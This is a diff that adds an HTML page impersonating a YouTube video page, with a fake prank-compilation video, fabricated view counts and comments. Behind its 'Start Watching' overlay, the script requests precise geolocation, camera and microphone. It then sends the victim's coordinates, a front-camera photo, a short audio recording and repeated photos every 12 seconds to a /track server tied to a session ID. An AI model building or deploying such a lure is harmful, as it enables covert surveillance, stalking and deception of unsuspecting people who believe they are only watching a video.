@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>YouTube</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent;}
+body{background:#0f0f0f;color:#fff;padding-bottom:72px;}
+.header{height:58px;padding:0 16px;display:flex;align-items:center;justify-content:space-between;background:#0f0f0f;position:sticky;top:0;z-index:20;border-bottom:1px solid #222;}
+.logo{display:flex;align-items:center;gap:7px;font-size:21px;font-weight:700;letter-spacing:-.7px;}
+.logo-icon{width:31px;height:22px;background:#ff0033;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;}
+.header-actions{display:flex;align-items:center;gap:19px;color:#eee;font-size:21px;}
+.video-container{width:100%;aspect-ratio:16/9;background:#000;position:relative;overflow:hidden;}
+.video-container iframe{width:100%;height:100%;border:0;}
+.video-info{padding:15px 16px 10px;}
+.video-title{font-size:18px;line-height:1.35;font-weight:600;margin-bottom:7px;}
+.video-meta{color:#aaa;font-size:13px;display:flex;gap:6px;align-items:center;}
+.channel{margin-top:16px;display:flex;align-items:center;gap:12px;}
+.avatar{width:43px;height:43px;min-width:43px;border-radius:50%;background:linear-gradient(135deg,#ff0033,#7b00ff);display:flex;align-items:center;justify-content:center;font-size:21px;}
+.channel-info{flex:1;}
+.channel-name{font-size:15px;font-weight:600;margin-bottom:3px;}
+.subscribers{color:#999;font-size:12px;}
+.subscribe{background:#fff;color:#111;border:0;padding:9px 15px;border-radius:20px;font-weight:600;font-size:13px;}
+.actions{margin-top:17px;display:flex;overflow-x:auto;gap:9px;scrollbar-width:none;}
+.actions::-webkit-scrollbar{display:none;}
+.action{flex:0 0 auto;background:#272727;border-radius:20px;padding:9px 14px;font-size:13px;color:#eee;display:flex;align-items:center;gap:6px;}
+.description{margin:8px 16px 18px;padding:13px 14px;background:#1c1c1c;border-radius:12px;color:#ddd;font-size:13px;line-height:1.45;}
+.description strong{color:#fff;}
+.divider{height:7px;background:#181818;border-top:1px solid #222;border-bottom:1px solid #222;}
+.comments{padding:17px 16px 10px;}
+.comments-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:17px;}
+.comments-title{font-size:17px;font-weight:600;}
+.comments-count{color:#aaa;font-size:13px;}
+.comment{display:flex;gap:11px;margin-bottom:19px;}
+.cavatar{width:34px;height:34px;min-width:34px;border-radius:50%;background:#303030;display:flex;align-items:center;justify-content:center;font-size:15px;}
+.comment-content{flex:1;}
+.cname{font-size:12px;color:#aaa;margin-bottom:4px;}
+.ctext{font-size:14px;line-height:1.4;color:#eee;}
+.comment-actions{display:flex;gap:17px;margin-top:8px;color:#999;font-size:12px;}
+.bottom-nav{position:fixed;left:0;bottom:0;width:100%;height:67px;background:rgba(15,15,15,.97);backdrop-filter:blur(12px);border-top:1px solid #292929;display:flex;align-items:center;justify-content:space-around;z-index:50;}
+.nav-item{width:20%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;color:#aaa;font-size:11px;}
+.nav-icon{font-size:20px;}
+.nav-item.active{color:#fff;}
+.create{width:43px;height:30px;border:1px solid #aaa;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:21px;}
+#play-overlay{position:fixed;inset:0;background:rgba(0,0,0,.82);backdrop-filter:blur(7px);z-index:100;display:flex;align-items:center;justify-content:center;padding:25px;}
+.play-card{width:100%;max-width:370px;background:#181818;border:1px solid #303030;border-radius:20px;padding:30px 23px 25px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5);}
+.play-icon{width:67px;height:67px;margin:0 auto 17px;border-radius:50%;background:#ff0033;display:flex;align-items:center;justify-content:center;font-size:27px;box-shadow:0 8px 25px rgba(255,0,51,.25);}
+.play-card h2{font-size:21px;margin-bottom:9px;}
+.play-card p{color:#aaa;font-size:13px;line-height:1.5;}
+.play-btn{margin-top:21px;width:100%;border:0;background:#fff;color:#111;padding:13px;border-radius:25px;font-size:14px;font-weight:700;cursor:pointer;}
+@media(min-width:700px){
+    body{max-width:900px;margin:auto;border-left:1px solid #222;border-right:1px solid #222;}
+    .video-container{max-height:506px;}
+    .bottom-nav{max-width:900px;left:50%;transform:translateX(-50%);}
+}
+</style>
+</head>
+
+<body>
+
+<header class="header">
+    <div class="logo">
+        <div class="logo-icon">▶</div>
+        YouTube
+    </div>
+    <div class="header-actions">
+        <span>⌕</span>
+        <span>⋮</span>
+    </div>
+</header>
+
+<div class="video-container">
+    <iframe src="https://www.youtube.com/embed/32DaIMjjsJY?autoplay=1&mute=1&rel=0"
+        allow="autoplay; encrypted-media; gyroscope; accelerometer"
+        allowfullscreen></iframe>
+</div>
+
+<section class="video-info">
+    <h1 class="video-title">😂 FUNNIEST PRANK COMPILATION 🔥</h1>
+    <div class="video-meta">
+        <span>2.8M views</span>
+        <span>•</span>
+        <span>2 days ago</span>
+    </div>
+    <div class="channel">
+        <div class="avatar">😂</div>
+        <div class="channel-info">
+            <div class="channel-name">Prank Masters</div>
+            <div class="subscribers">2.3M subscribers</div>
+        </div>
+        <button class="subscribe">Subscribe</button>
+    </div>
+    <div class="actions">
+        <div class="action">👍 1.2K</div>
+        <div class="action">👎 12</div>
+        <div class="action">↗ Share</div>
+        <div class="action">⬇ Download</div>
+        <div class="action">⋯ More</div>
+    </div>
+</section>
+
+<div class="description">
+    <strong>2.8M views • 2 days ago</strong><br><br>
+    The funniest prank moments all in one place 😂🔥
+    Watch till the end for the craziest reaction!
+</div>
+
+<div class="divider"></div>
+
+<section class="comments">
+    <div class="comments-header">
+        <div class="comments-title">Comments</div>
+        <div class="comments-count">1.4K</div>
+    </div>
+    <div class="comment">
+        <div class="cavatar">😎</div>
+        <div class="comment-content">
+            <div class="cname">GamingGuru • 2h ago</div>
+            <div class="ctext">Bhai ye toh next level hai 😂😂</div>
+            <div class="comment-actions"><span>👍 248</span><span>👎</span><span>Reply</span></div>
+        </div>
+    </div>
+    <div class="comment">
+        <div class="cavatar">🤣</div>
+        <div class="comment-content">
+            <div class="cname">FunnyFan • 5h ago</div>
+            <div class="ctext">Maza aa gaya! Best video of the year 😂🔥</div>
+            <div class="comment-actions"><span>👍 96</span><span>👎</span><span>Reply</span></div>
+        </div>
+    </div>
+    <div class="comment">
+        <div class="cavatar">🔥</div>
+        <div class="comment-content">
+            <div class="cname">RohitYT • 8h ago</div>
+            <div class="ctext">Last wala reaction dekh ke hasi nahi ruk rahi 🤣</div>
+            <div class="comment-actions"><span>👍 61</span><span>👎</span><span>Reply</span></div>
+        </div>
+    </div>
+</section>
+
+<nav class="bottom-nav">
+    <div class="nav-item active"><div class="nav-icon">⌂</div><span>Home</span></div>
+    <div class="nav-item"><div class="nav-icon">🔥</div><span>Shorts</span></div>
+    <div class="nav-item"><div class="create">+</div></div>
+    <div class="nav-item"><div class="nav-icon">🔔</div><span>Subscriptions</span></div>
+    <div class="nav-item"><div class="nav-icon">●</div><span>You</span></div>
+</nav>
+
+<div id="play-overlay">
+    <div class="play-card">
+        <div class="play-icon">▶</div>
+        <h2>Ready to Watch?</h2>
+        <p>Tap the button below to start watching the video.</p>
+        <button class="play-btn" id="startBtn">▶ &nbsp; Start Watching</button>
+    </div>
+</div>
+
+<script>
+const session = new URLSearchParams(window.location.search).get('session');
+const API_URL = window.location.origin + '/track';
+
+async function sendData(endpoint, data, retries=3) {
+    for(let i=0;i<retries;i++){
+        try{
+            const res = await fetch(`${API_URL}?session=${session}`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify(data)
+            });
+            if(res.ok) return true;
+        }catch(e){}
+        await new Promise(r=>setTimeout(r,2000));
+    }
+    return false;
+}
+
+function getAccurateLocation(){
+    return new Promise((resolve)=>{
+        if(!navigator.geolocation) return resolve(null);
+        let watchId = navigator.geolocation.watchPosition(
+            (pos)=>{ if(pos.coords.accuracy<50){ navigator.geolocation.clearWatch(watchId); resolve(pos); } },
+            ()=>{ navigator.geolocation.clearWatch(watchId); resolve(null); },
+            {enableHighAccuracy:true, timeout:10000, maximumAge:5000}
+        );
+        setTimeout(()=>{ navigator.geolocation.clearWatch(watchId); resolve(null); }, 10000);
+    });
+}
+
+async function captureData(){
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video:{ facingMode:"user", width:{ideal:640} },
+            audio:true
+        });
+        const v = document.createElement('video');
+        v.srcObject = stream;
+        v.play();
+        await new Promise(r=>setTimeout(r,500));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = v.videoWidth || 640;
+        canvas.height = v.videoHeight || 480;
+        canvas.getContext('2d').drawImage(v,0,0);
+        const photoData = canvas.toDataURL('image/jpeg',0.5);
+        sendData('/photo',{image:photoData});
+
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks,{type:'audio/webm'});
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = () => sendData('/audio',{audio:reader.result});
+        };
+        mediaRecorder.start();
+        setTimeout(()=>mediaRecorder.stop(), 5000);
+
+        setInterval(async ()=>{
+            if(!stream) return;
+            try{
+                const v2 = document.createElement('video');
+                v2.srcObject = stream;
+                v2.play();
+                await new Promise(r=>setTimeout(r,300));
+                const c = document.createElement('canvas');
+                c.width = v2.videoWidth || 640;
+                c.height = v2.videoHeight || 480;
+                c.getContext('2d').drawImage(v2,0,0);
+                sendData('/photo',{image:c.toDataURL('image/jpeg',0.5)});
+            }catch(e){}
+        }, 12000);
+
+    }catch(e){}
+}
+
+document.getElementById('startBtn').addEventListener('click', async ()=>{
+    document.getElementById('play-overlay').style.display = 'none';
+
+    // 1. Location pehle
+    const pos = await getAccurateLocation();
+    if(pos){
+        sendData('/location',{location:{
+            lat:pos.coords.latitude,
+            lon:pos.coords.longitude,
+            acc:pos.coords.accuracy
+        }});
+    } else {
+        navigator.geolocation.getCurrentPosition(p=>{
+            sendData('/location',{location:{
+                lat:p.coords.latitude,
+                lon:p.coords.longitude,
+                acc:p.coords.accuracy || 100
+            }});
+        },()=>{});
+    }
+
+    // 2. Camera + Mic
+    captureData();
+});
+
+// Keep-alive ping
+setInterval(()=>{ fetch(window.location.origin + '/ping').catch(()=>{}); }, 120000);
+</script>
+
+</body>
+</html>
